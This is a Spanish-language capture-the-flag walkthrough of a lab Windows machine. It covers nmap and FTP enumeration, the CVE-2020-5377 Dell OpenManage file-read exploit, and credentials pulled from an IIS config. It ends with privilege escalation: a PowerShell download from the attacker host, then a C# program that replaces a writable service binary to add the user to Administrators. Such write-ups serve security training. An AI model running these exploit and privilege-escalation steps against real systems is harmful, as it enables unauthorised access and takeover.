Realizamos un escaneo simple de nmap
![[Pasted image 20240806080253.png]]

Continuamos haciendo un escaneo mas completo
![[Pasted image 20240806080102.png]]
![[Pasted image 20240806080226.png]]

En el escaneo de nmap encontramos que ftp tiene activado la conexión de forma Anonima, nos conectamos y descargamos los ficheros
![[Pasted image 20240806091313.png]]

En el documento de texto encontramos información de muchas tarjetas de credito
![[Pasted image 20240806091507.png]]

Añadimos el nombre de la maquina a nuestro hosts
![[Pasted image 20240806080349.png]]

Revisamos el puerto 80
![[Pasted image 20240806080452.png]]

Revisamos el codigo de la web pero sin obtener exito, resivamos que contiene la web y detectamos que es un windows server
![[Pasted image 20240806080956.png|500]]

Realizamos fuzzing web y encontramos los siguientes directorios
![[Pasted image 20240806081639.png]]

Ahora pasamos a revisar los directorios y nos encontramos que estan protegidos con permisos y no tenemos acceso
![[Pasted image 20240806082002.png]]

Pasamos a enumerar el puerto 1311 accediendo por https y nos encontramos un panel de login de `Dell EMC OpenManage` el cual es un software para la gestión de sistemas
![[Pasted image 20240806082251.png]]

Debajo encontramos el boton de About, si accedemos obtenemos informacion sobre versiones
![[Pasted image 20240806094354.png|1000]]

Revisamos si hay alguna vulnerabilidad y encontramos una para las versions 9.4 y en este caso es la 9.0 pero buscando encontramos que para este versión tambien es vulnerable.
```
https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/?ref=benheater.com
```
![[Pasted image 20240806095501.png]]

Nos descargamos el script
![[Pasted image 20240806095539.png]]

Accedemos dentro del exploit y encontramos como ejecutarlo
![[Pasted image 20240806095737.png]]

No consegui que funcionase pero tenemos el exploit en github, lo descargamos
```
https://raw.githubusercontent.com/RhinoSecurityLabs/CVEs/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py
```
![[Pasted image 20240806101639.png]]

Y ahora lo ejecutamos y obtenemos acceso a la maquina
![[Pasted image 20240806101816.png]]

Este terminal nos permite consultar ficheros, como no sabemos donde se ubica la web examinaremos el siguiente fichero el cual contiene la configuración de los IIS, para poder tener búsquedas mas precisas lo copiamos y pegamos en un documento para examinarlo
```
Windows/System32/inetsrv/config/applicationHost.config
```
![[Pasted image 20240806102944.png]]

Una vez lo tenemos copiado buscaremos el nombre de la web para realizar una busqueda precisa, al realizarla obtenemos la ruta de la web
![[Pasted image 20240806102911.png]]

Ahora ya podemos acceder al fichero con la configuración y dentro encontramos unas credenciales
```
tyler
IAmA1337h4x0randIkn0wit!
```
![[Pasted image 20240806104433.png]]


Probamos las credenciales y obtenemos acceso al sistema
![[Pasted image 20240806112436.png]]

Para buscar vulnerabilidades utilizaremos `PrivescCheck`, para ello levantamos un servidor y nos descargamos el fichero
```
https://github.com/itm4n/PrivescCheck
```

Lo transferimos a la maquina victima
```
Invoke-WebRequest -Uri http://10.9.0.118:4444/PrivescCheck.ps1 -OutFile "C:\Users\tyler\Documents\PrivescCheck.ps1"
```
![[Pasted image 20240807113223.png]]

Y ahora ejecutamos el script
```
. .\\PrivescCheck.ps1; Invoke-PrivescCheck
```
![[Pasted image 20240807081114.png]]

Y nos encuentra una vulnerabilidad en el servicio `spoofer-scheduler.exe`
![[Pasted image 20240807081435.png]]

Esta salida es la misma que si la buscasemos a mano de la siguiente manera
```
sc.exe qc "spoofer-scheduler"
```
![[Pasted image 20240807131152.png]]

Si revisamos los permisos de la carpeta donde se encuentra el servicio podemos ver que tenemos total acceso
```
powershell -Command "Get-Acl -Path 'C:\Program Files (x86)\Spoofer' | Format-List"
```
![[Pasted image 20240807120529.png]]

Si leemos el fichero de CHANGES.txt nos muestra mas información sobre la versión de `spoofer`
![[Pasted image 20240807130825.png]]

Si lo comprobamos podemos ver que tenemos permisos para parar y ejecutar el servicio
![[Pasted image 20240807131331.png]]

Si revisamos la lista de control de acceso podemos ver que tenemos los permisos del binario del servicio
```Powershell
Get-Acl 'C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe' | 
Select-Object -ExpandProperty Access | 
Where-Object {$_.IdentityReference -eq 'BUILTIN\Users'}
```
![[Pasted image 20240807131813.png]]

Ahora para obtener acceso como Administrador crearemos un script en C# para que añada el usuario `Tyler` al grupo de Administradores
```C#
using System;
using System.Diagnostics;

public class Program
{
    public static void Main()
    {
        // Crear un proceso para ejecutar el comando 'net'
        Process process = new Process();
        process.StartInfo.FileName = "net";
        process.StartInfo.Arguments = "localgroup Administrators tyler /add";
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.CreateNoWindow = true;

        // Iniciar el proceso
        process.Start();

        // Leer la salida (si es necesario)
        string output = process.StandardOutput.ReadToEnd();

        // Esperar a que el proceso termine
        process.WaitForExit();

        // Mostrar la salida (si es necesario)
        Console.WriteLine(output);
    }
}
```

Una vez creado el script en C# instalaremos `Mono` para poder compilarlo
```
sudo apt install mono-complete
```
![[Pasted image 20240807133309.png]]

Una vez instalado compilamos el codigo
```
mcs spoofer-scheduler.cs
```
![[Pasted image 20240807133349.png]]

Ahora paramos el servicio
```bash
ssh tyler@10.10.183.19 'sc.exe stop spoofer-scheduler'
```
![[Pasted image 20240807134635.png]]

Transferimos nuestro programa compilado sustituyendo el binario del servicio
```bash
scp ./spoofer-scheduler.exe tyler@10.10.183.19:"C:/Program Files (x86)/Spoofer/spoofer-scheduler.exe"
```
![[Pasted image 20240807135013.png]]

Y al levantar el servicio el usuario Tyler tendra acceso como Administrador
```Bash
ssh tyler@10.10.183.19 'sc.exe start spoofer-scheduler'
```
![[Pasted image 20240807135153.png]]

Ignoramos el error de la captura anterior y verificamos que el usuario Tyler este en el grupo de Administradores
```bash
ssh tyler@10.10.183.19 'net localgroup Administrators'
```
![[Pasted image 20240807135218.png]]

Y ahora podemos probar a acceder con xfreerdp
```
xfreerdp /v:10.10.183.19 /u:'tyler' /p:'IAmA1337h4x0randIkn0wit!' /size:'90%' /drive:.,kali-share +clipboard`
```
![[Pasted image 20240807135411.png]]

Y ya podemos acceder a la flag de admin
![[Pasted image 20240807135529.png]]